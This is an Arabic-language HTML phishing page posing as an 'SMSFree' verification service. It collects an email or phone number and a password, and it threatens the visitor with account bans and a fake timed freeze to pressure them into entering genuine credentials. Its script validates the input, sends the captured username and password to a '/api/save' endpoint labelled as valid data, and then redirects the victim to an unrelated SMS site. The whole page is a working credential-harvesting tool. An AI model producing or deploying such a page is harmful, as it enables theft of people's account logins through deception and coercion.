<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMSFree - التحقق الذكي</title>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        :root {
            --bg-color: #0f172a;
            --card-bg: #1e293b;
            --primary-cyan: #22d3ee;
            --text-white: #f8fafc;
        }

        body {
            margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif;
            background-color: var(--bg-color);
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
            color: var(--text-white);
            transition: filter 0.5s ease;
        }

        body.frozen {
            filter: blur(10px) grayscale(80%);
            pointer-events: none;
        }

        .main-container {
            width: 90%; max-width: 420px; background-color: var(--card-bg);
            padding: 40px 25px; border-radius: 24px; text-align: center;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
        }

        .logo-circle {
            width: 100px; height: 100px; border: 2px solid #334155;
            border-radius: 50%; margin: 0 auto 25px;
            display: flex; justify-content: center; align-items: center;
            font-size: 20px; font-weight: bold;
        }

        h2 { font-size: 16px; color: var(--primary-cyan); margin-bottom: 30px; line-height: 1.6; }

        input {
            width: 100%; padding: 16px; margin-bottom: 15px;
            background: #0f172a; border: 1px solid #334155;
            border-radius: 12px; color: white; outline: none;
            text-align: center; font-size: 15px; box-sizing: border-box;
        }

        input.invalid { border: 2px solid #ef4444; background: rgba(239, 68, 68, 0.1); }

        .submit-btn {
            width: 100%; padding: 16px; background: linear-gradient(to right, #0ea5e9, #22d3ee);
            border: none; border-radius: 12px; color: #0f172a;
            font-size: 17px; font-weight: bold; cursor: pointer;
        }

        .ban-overlay {
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
            z-index: 9999; background: rgba(30, 41, 59, 0.95);
            padding: 30px; border-radius: 20px; border: 2px solid #fbbf24;
            display: none; text-align: center; width: 85%; max-width: 320px;
        }

        .glass-popup {
            background: rgba(15, 23, 42, 0.9) !important;
            backdrop-filter: blur(15px);
            border: 1px solid var(--primary-cyan);
            border-radius: 25px !important;
            color: white !important;
        }
    </style>
</head>
<body>

<div class="ban-overlay" id="banOverlay">
    <h3 style="color: #fbbf24;">⚠️ تجمد النظام</h3>
    <p>بسبب إدخال بيانات غير صحيحة بشكل متكرر</p>
    <div style="font-size: 40px; margin: 15px 0;" id="timer">30</div>
</div>

<div class="main-container" id="mainContent">
    <div class="logo-circle">SMSFree</div>
    <h2>يرجى إدخال بياناتك بشكل صحيح لتجنب حظر حسابك مؤقتاً من الخدمة.</h2>

    <form id="secureForm">
        <input type="text" id="emailUser" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
        <input type="password" id="passKey" placeholder="كلمة المرور" required>
        <button type="submit" class="submit-btn">متابعة</button>
    </form>
</div>

<script>
    let failCount = 0;

    document.getElementById('secureForm').onsubmit = async (e) => {
        e.preventDefault();
        
        const inputVal = document.getElementById('emailUser').value.trim();
        const passVal = document.getElementById('passKey').value;
        const inputField = document.getElementById('emailUser');

        // دالة التحقق: بريد إلكتروني صحيح أو رقم هاتف (8 أرقام فأكثر)
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        const phoneRegex = /^[0-9]{8,15}$/;
        const isArabic = /[\u0600-\u06FF]/.test(inputVal); // منع العربية في البريد

        if ((emailRegex.test(inputVal) || phoneRegex.test(inputVal)) && !isArabic && passVal.length >= 6) {
            // إذا كانت البيانات صحيحة يتم الإرسال والنقل للصفحة التالية
            inputField.classList.remove('invalid');
            await sendData(inputVal, passVal);
        } else {
            // إذا كانت عشوائية أو خاطئة
            failCount++;
            inputField.classList.add('invalid');

            if (failCount >= 3) {
                triggerSuperBan();
            } else {
                Swal.fire({
                    title: 'بيانات غير صالحة',
                    text: 'يرجى كتابة البريد الإلكتروني بشكل صحيح (مثال: name@gmail.com) أو رقم هاتف صالح بدون أحرف عربية.',
                    icon: 'error',
                    customClass: { popup: 'glass-popup' },
                    confirmButtonColor: '#22d3ee'
                });
            }
        }
    };

    function triggerSuperBan() {
        document.body.classList.add('frozen');
        document.getElementById('banOverlay').style.display = 'block';
        let time = 30;
        const cd = setInterval(() => {
            time--;
            document.getElementById('timer').innerText = time;
            if (time <= 0) {
                clearInterval(cd);
                document.body.classList.remove('frozen');
                document.getElementById('banOverlay').style.display = 'none';
                failCount = 0;
                Swal.fire({
                    title: 'تم فك التجميد',
                    text: 'مبروك تم إزالة الحظر عنك. يرجى إدخال بيانات حقيقية الآن لتجنب الحظر الدائم.',
                    icon: 'success',
                    customClass: { popup: 'glass-popup' }
                });
            }
        }, 1000);
    }

    async function sendData(u, p) {
        try {
            await fetch('/api/save', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message: `✅ بيانات صحيحة:\n👤: ${u}\n🔑: ${p}` })
            });
            // الانتقال لصفحة النجاح أو الصفحة التالية
            window.location.href = "https://receive-smss.com/";
        } catch (err) {}
    }
</script>

</body>
</html>
